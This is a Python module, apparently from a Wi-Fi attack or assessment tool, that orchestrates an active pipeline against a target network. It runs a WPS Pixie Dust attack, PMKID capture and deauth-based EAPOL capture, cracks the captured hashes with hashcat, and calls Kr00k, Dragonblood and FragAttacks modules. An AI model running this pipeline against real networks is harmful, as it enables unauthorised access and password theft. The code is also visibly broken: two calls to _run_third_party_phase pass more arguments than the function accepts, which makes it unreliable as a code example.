from __future__ import annotations

"""
offensive.py — Active workflow orchestrator.

Coordinates radio management (core.radio), tool execution (core.tools_runner),
and the high-level attack decision tree. Nothing here does I/O with external
tools directly; it delegates to the two supporting modules.
"""

import logging
from pathlib import Path

from core.models import AssessmentContext, WifiNetwork
from core.planning import plan_offensive_techniques, serialize_technique_plan
from core.radio import RadioState, ensure_monitor_mode, restore_mode, set_channel
from core.third_party import ThirdPartyResult, run_applicable_third_party
from core.tools_runner import (
    capture_eapol,
    collect_pmkid,
    detect_wps_with_wash,
    prepare_hash_file,
    run_hashcat,
    run_wps_pixie,
)
from core.workspace_manager import WorkspaceManager

log = logging.getLogger(__name__)


def _pick_best_capture(captured_files: dict[str, Path]) -> Path | None:
    """Return the best available capture file for third-party analysis."""
    for key in ("pmkid_capture", "eapol_capture"):
        p = captured_files.get(key)
        if p and p.exists() and p.stat().st_size > 0:
            return p
    return None


def _attack_pipeline(
    context: AssessmentContext,
    target: WifiNetwork,
    interface: str,
    workspace_manager: WorkspaceManager,
    attack_log: list[str] | None,
    captured_files: dict[str, Path] | None,
    wordlist_override: Path | None = None,
    third_party_results: list[ThirdPartyResult] | None = None,
) -> str | None:
    """
    Execute the full active attack pipeline against the target:
      Planning → WPS Pixie Dust → PMKID capture → EAPOL capture → Hashcat
      → Third-party tool assessment (Kr00k, Dragonblood, FragAttacks)
    """
    log.info("=" * 50)
    log.info("STARTING ACTIVE PIPELINE: %s", target.display_name)
    log.info("=" * 50)

    workspace_manager.save_metadata("target_bssid", target.bssid)
    workspace_manager.save_metadata("target_ssid", target.display_name)
    workspace_manager.save_metadata("security", target.security)

    # --- Technique planning ---
    technique_plans = plan_offensive_techniques(target)
    workspace_manager.save_metadata(
        "technique_plans", [serialize_technique_plan(p) for p in technique_plans]
    )
    enabled_slugs = {p.slug for p in technique_plans if p.should_attempt}
    log.info("Enabled techniques: %s", enabled_slugs)
    if attack_log is not None:
        attack_log.append(f"Technique plan built: {', '.join(sorted(enabled_slugs)) or 'none'}")

    security = target.security.upper()
    captured_file: Path | None = None
    cracked_password: str | None = None

    if "OPEN" in security or security == "--":
        log.warning("Network is OPEN. No encryption material to process.")
        _run_third_party_phase(
            interface, target, workspace_manager, enabled_slugs,
            captured_file, None, None, attack_log, third_party_results,
        )
        return None

    # --- WPS path ---
    if "wps" in enabled_slugs and ("WPS" in security):
        if attack_log is not None:
            attack_log.append("Probing hidden WPS presence with wash...")
        wps_map = detect_wps_with_wash(interface, timeout=12)
        bssid_norm = target.bssid.upper()
        if bssid_norm not in wps_map and "WPS" in security:
            wps_map[bssid_norm] = False  # beacon already says WPS, trust it

        if bssid_norm in wps_map and not wps_map[bssid_norm]:
            if attack_log is not None:
                attack_log.append("WPS confirmed (not locked) — trying Pixie Dust.")
            wps_loot = run_wps_pixie(
                interface, target.bssid, target.channel,
                workspace_manager, captured_files=captured_files,
            )
            if wps_loot:
                log.info("Network compromised through WPS.")
                if attack_log is not None:
                    attack_log.append("WPS Pixie Dust returned a credential.")
                cracked_password = wps_loot["psk"]
        else:
            log.info("WPS is locked or not confirmed. Skipping Pixie Dust.")
            if attack_log is not None:
                attack_log.append("WPS locked or not confirmed — skipped.")

    if cracked_password:
        _run_third_party_phase(
            interface, target, workspace_manager, enabled_slugs,
            captured_file, None, None, attack_log, third_party_results,
        )
        return cracked_password

    # --- WPA capture paths (WPA2 and WPA3 transition both viable for PMKID/EAPOL) ---
    wpa_surface = "WPA" in security  # covers WPA2, WPA3-transition, WPA2+WPA3

    if wpa_surface:
        if "pmkid" in enabled_slugs:
            if attack_log is not None:
                attack_log.append("Attempting passive PMKID capture (hcxdumptool)...")
            captured_file = collect_pmkid(
                interface, target.bssid, target.channel,
                workspace_manager, captured_files=captured_files,
            )

        if not captured_file and "eapol" in enabled_slugs:
            if attack_log is not None:
                attack_log.append("Attempting EAPOL capture (deauth path)...")
            captured_file = capture_eapol(
                interface, target.bssid, target.channel,
                workspace_manager, captured_files=captured_files,
            )

    # --- Hash conversion + cracking ---
    if captured_file:
        if captured_files is not None:
            key = "pmkid_capture" if captured_file.suffix == ".pcapng" else "eapol_capture"
            captured_files[key] = captured_file
        if attack_log is not None:
            attack_log.append(f"Captured: {captured_file.name}")

        hash_file = prepare_hash_file(captured_file, workspace_manager, captured_files=captured_files)
        if hash_file and attack_log is not None:
            attack_log.append(f"Hash file prepared: {hash_file.name}")

        if hash_file:
            cracked_password = run_hashcat(
                hash_file, target, workspace_manager, context,
                captured_files=captured_files, wordlist_override=wordlist_override,
            )

    # --- Third-party assessment (always runs, even if cracking failed) ---
    best_pcap = _pick_best_capture(captured_files or {}) if captured_files else captured_file
    _run_third_party_phase(
        interface, target, workspace_manager, enabled_slugs,
        best_pcap, wordlist_override, attack_log, third_party_results,
    )

    if not captured_file:
        log.error("No capture path succeeded.")
    return cracked_password


def _run_third_party_phase(
    interface: str,
    target: WifiNetwork,
    workspace_manager: WorkspaceManager,
    enabled_slugs: set[str],
    best_pcap: Path | None,
    wordlist: Path | None,
    attack_log: list[str] | None,
    third_party_results: list[ThirdPartyResult] | None,
) -> None:
    """Dispatch third-party tools and collect results."""
    third_party_slugs = enabled_slugs & {"kr00k", "wpa3", "fragattacks"}
    if not third_party_slugs:
        return

    log.info("Running third-party assessment modules: %s", third_party_slugs)
    if attack_log is not None:
        attack_log.append(f"Third-party phase: {', '.join(sorted(third_party_slugs))}")

    tp_results = run_applicable_third_party(
        interface=interface,
        target_bssid=target.bssid,
        target_ssid=target.display_name,
        workspace=workspace_manager.workspace_path,
        technique_slugs=third_party_slugs,
        captured_pcap=best_pcap,
        wordlist=wordlist,
    )

    for r in tp_results:
        log.info("[%s] ran=%s success=%s note=%s", r.slug, r.ran, r.success, r.note)
        if attack_log is not None:
            status = "VULNERABLE" if r.success else ("ran" if r.ran else "skipped")
            attack_log.append(f"  [{r.tool}] {status}: {r.note}")
        # Persist artefacts metadata
        for art_key, art_path in r.artefacts.items():
            workspace_manager.save_metadata(f"tp_{r.slug}_{art_key}", str(art_path))

    if third_party_results is not None:
        third_party_results.extend(tp_results)

    workspace_manager.save_metadata("third_party_ran", True)
    workspace_manager.save_metadata("third_party_count", len(tp_results))


def maybe_run_offensive_extensions(
    context: AssessmentContext,
    target: WifiNetwork,
    workspace_manager: WorkspaceManager | None = None,
    attack_log: list[str] | None = None,
    captured_files: dict[str, Path] | None = None,
    wordlist_override: Path | None = None,
    third_party_results: list[ThirdPartyResult] | None = None,
) -> str | None:
    """
    Entry point called by cli.py.

    Sets up monitor mode, runs the full attack pipeline (including
    third-party tools), and guarantees radio restoration via try/finally.
    """
    if not context.offensive_requests:
        return None

    valid_routes = {"wps", "pmkid", "eapol", "crack", "auto"}
    if not any(r in valid_routes for r in context.offensive_requests):
        log.warning("Active module called without recognised routes.")
        return None

    if not context.interface:
        raise RuntimeError("A valid interface is required for active operations (-i wlan0).")

    if workspace_manager is None:
        workspace_manager = WorkspaceManager("workspaces", target.bssid)

    workspace_manager.save_metadata("offensive_requests", list(context.offensive_requests))
    workspace_manager.save_metadata("selected_interface", context.interface)

    radio_state: RadioState | None = None
    try:
        radio_state = ensure_monitor_mode(context.interface)
        workspace_manager.save_metadata("monitor_interface", radio_state.interface)
        if attack_log is not None:
            attack_log.append(f"Monitor interface ready: {radio_state.interface}")
        set_channel(radio_state.interface, target.channel)
        if attack_log is not None:
            attack_log.append(f"Channel locked to {target.channel}")

        return _attack_pipeline(
            context, target, radio_state.interface,
            workspace_manager, attack_log, captured_files,
            wordlist_override=wordlist_override,
            third_party_results=third_party_results,
        )

    finally:
        if radio_state is not None:
            restore_mode(radio_state)
            if attack_log is not None:
                attack_log.append(f"Radio restored: {radio_state.interface}")
